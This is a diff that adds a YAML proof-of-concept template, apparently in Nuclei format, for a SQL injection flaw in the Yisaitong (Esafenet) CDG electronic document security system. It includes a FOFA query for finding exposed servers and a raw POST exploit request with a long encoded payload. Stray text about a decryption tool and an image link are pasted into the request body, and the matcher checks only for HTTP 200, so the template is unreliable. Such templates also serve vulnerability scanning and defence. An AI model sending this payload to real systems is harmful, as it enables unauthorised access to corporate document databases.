@@ -1,0 +1,31 @@
+id: poc-hzmeplgaf90ngw95
+info:
+  name: 亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hzmeplgaf90ngw95'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hzmeplgaf90ngw95
+    fofa: body="/CDGServer3/index.jsp"
+http:
+- raw:
+  - 'POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDAKIPEINHHOFBOHLPEJBPJBKJLDDEIFOGLGHKANECEEGNDCNMJNLNJBFKNGKKJFODMFEKBOGFNDNJMCMHOFJBLGHEBALFGNNGLPBMKHHHGNKNHJGLFLODDIKAAOOOAJAEMBLBNMGOFJELPABKOEGMFLIBGPMHJPEJCKFBGHHNGMDAJBKBNNMIMFELPGEHDFGNHMBLEIKMINOAOAINBLEOIGHAMOPDNOIFFEFLGBFOFAGACH
+
+    解密工具：
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974764212-d4a341cc-7552-4b56-99f5-76fc996ea2aa.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
